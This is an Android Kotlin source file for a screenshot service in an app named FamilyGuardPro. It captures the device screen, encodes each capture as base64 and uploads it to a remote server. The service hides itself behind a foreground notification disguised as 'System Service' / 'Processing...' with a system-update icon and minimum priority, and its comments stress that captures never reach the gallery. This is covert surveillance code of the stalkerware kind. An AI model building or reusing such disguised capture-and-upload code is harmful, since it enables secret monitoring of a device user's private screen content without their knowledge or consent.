package com.familyguardpro.services

import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

/**
 * Screenshot Service - Captures screen using MediaProjection
 * Screenshots are saved to app's private directory and uploaded to server
 * Never saved to gallery
 */
class ScreenshotService : Service() {
    
    companion object {
        private const val TAG = "ScreenshotService"
        private const val NOTIFICATION_ID = 1020
        
        const val ACTION_CAPTURE = "CAPTURE_SCREENSHOT"
        
        // Store MediaProjection permission result
        private var mediaProjectionResultCode: Int = 0
        private var mediaProjectionResultData: Intent? = null
        
        fun setMediaProjectionResult(resultCode: Int, data: Intent?) {
            mediaProjectionResultCode = resultCode
            mediaProjectionResultData = data
        }
        
        fun hasMediaProjectionPermission(): Boolean {
            return mediaProjectionResultCode == Activity.RESULT_OK && mediaProjectionResultData != null
        }
        
        fun startCapture(context: Context) {
            val intent = Intent(context, ScreenshotService::class.java).apply {
                action = ACTION_CAPTURE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, intent)
            } else {
                context.startService(intent)
            }
        }
    }
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    
    private var screenWidth = 720
    private var screenHeight = 1280
    private var screenDensity = 320
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "ScreenshotService created")
        getScreenMetrics()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL: Always call startForeground() first to avoid
        // ForegroundServiceDidNotStartInTimeException
        startForeground()
        
        when (intent?.action) {
            ACTION_CAPTURE -> {
                captureScreenshot()
            }
        }
        return START_NOT_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        cleanup()
        serviceScope.cancel()
        Log.d(TAG, "ScreenshotService destroyed")
    }
    
    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("System Service")
            .setContentText("Processing...")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID, 
                notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
    
    private fun getScreenMetrics() {
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = windowManager.currentWindowMetrics.bounds
            screenWidth = bounds.width()
            screenHeight = bounds.height()
            screenDensity = resources.displayMetrics.densityDpi
        } else {
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(metrics)
            screenWidth = metrics.widthPixels
            screenHeight = metrics.heightPixels
            screenDensity = metrics.densityDpi
        }
        
        // Scale down for efficiency
        screenWidth = (screenWidth * 0.5).toInt()
        screenHeight = (screenHeight * 0.5).toInt()
        
        Log.d(TAG, "Screen metrics: ${screenWidth}x${screenHeight} @ $screenDensity dpi")
    }
    
    private fun captureScreenshot() {
        if (!hasMediaProjectionPermission()) {
            Log.e(TAG, "No MediaProjection permission")
            // Request permission through ScreenCaptureActivity
            requestMediaProjectionPermission()
            return
        }
        
        serviceScope.launch {
            try {
                val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                
                mediaProjection = projectionManager.getMediaProjection(
                    mediaProjectionResultCode,
                    mediaProjectionResultData!!
                )
                
                if (mediaProjection == null) {
                    Log.e(TAG, "Failed to get MediaProjection")
                    stopSelf()
                    return@launch
                }
                
                // Set up image reader
                imageReader = ImageReader.newInstance(
                    screenWidth,
                    screenHeight,
                    PixelFormat.RGBA_8888,
                    2
                )
                
                // Create virtual display with combined flags for better compatibility
                val displayFlags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR or
                                  DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC
                
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenCapture",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    displayFlags,
                    imageReader?.surface,
                    null,
                    handler
                )
                
                // Wait a bit for the display to be ready
                delay(500)
                
                // Capture image
                val image = imageReader?.acquireLatestImage()
                if (image != null) {
                    val bitmap = imageToBitmap(image)
                    image.close()
                    
                    if (bitmap != null) {
                        // Convert to base64 and upload
                        val base64 = bitmapToBase64(bitmap)
                        uploadScreenshot(base64, screenWidth, screenHeight)
                        bitmap.recycle()
                    }
                } else {
                    Log.e(TAG, "Failed to acquire image")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot capture failed", e)
            } finally {
                cleanup()
                stopSelf()
            }
        }
    }
    
    private fun imageToBitmap(image: Image): Bitmap? {
        return try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth
            
            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            
            // Crop to exact screen size if needed
            if (rowPadding > 0) {
                Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
            } else {
                bitmap
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to convert image to bitmap", e)
            null
        }
    }
    
    private fun bitmapToBase64(bitmap: Bitmap): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
        val bytes = outputStream.toByteArray()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }
    
    private fun uploadScreenshot(base64Image: String, width: Int, height: Int) {
        serviceScope.launch {
            try {
                val deviceId = (applicationContext as? FamilyGuardApp)?.preferenceManager?.getDeviceId()
                if (deviceId.isNullOrEmpty()) {
                    Log.e(TAG, "No device ID")
                    return@launch
                }
                
                ApiClient.uploadScreenshot(deviceId, base64Image, width, height)
                Log.d(TAG, "Screenshot uploaded successfully")
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload screenshot", e)
            }
        }
    }
    
    private fun requestMediaProjectionPermission() {
        // Launch ScreenCaptureActivity to request permission
        val intent = com.familyguardpro.ScreenCaptureActivity.createIntent(this, false).apply {
            putExtra("screenshot_mode", true)
        }
        startActivity(intent)
        stopSelf()
    }
    
    private fun cleanup() {
        virtualDisplay?.release()
        virtualDisplay = null
        
        imageReader?.close()
        imageReader = null
        
        mediaProjection?.stop()
        mediaProjection = null
    }
}
